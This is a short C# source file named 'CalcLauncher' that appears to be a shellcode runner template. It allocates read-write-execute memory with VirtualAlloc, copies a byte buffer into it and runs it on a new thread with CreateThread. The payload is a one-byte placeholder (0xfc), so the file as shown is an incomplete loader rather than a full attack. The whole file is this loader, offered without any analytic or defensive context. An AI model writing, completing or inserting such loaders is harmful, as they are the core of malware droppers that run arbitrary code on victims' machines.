using System;
using System.Runtime.InteropServices;



namespace CalcLauncher
{
    public class Program
    {

        public Program()
        {
            CodeLoad();
        }

        public static void Main(string[] args)
        {
            new Program();
        }


        public static void CodeLoad()
        {


            byte[] buf1 = new byte[1] { 0xfc };
        
            UInt32 funcAddr = VirtualAlloc(0, (UInt32)buf1.Length, 0x1000, 0x40);
            //
            Marshal.Copy(buf1, 0, (IntPtr)(funcAddr), buf1.Length);

            IntPtr hThread = IntPtr.Zero;
            UInt32 threadId = 0;
            // prepare data


            IntPtr pinfo = IntPtr.Zero;

            // execute native code

            hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
            System.Threading.Thread.Sleep(100000000);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
            return;
        }

        [DllImport("kernel32")]
        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
          UInt32 size, UInt32 flAllocationType, UInt32 flProtect);


        [DllImport("kernel32")]
        private static extern IntPtr CreateThread(

         UInt32 lpThreadAttributes,
         UInt32 dwStackSize,
         UInt32 lpStartAddress,
         IntPtr param,
         UInt32 dwCreationFlags,
         ref UInt32 lpThreadId

         );

        [DllImport("kernel32")]
        private static extern UInt32 WaitForSingleObject(

         IntPtr hHandle,
         UInt32 dwMilliseconds
         );
    }
}
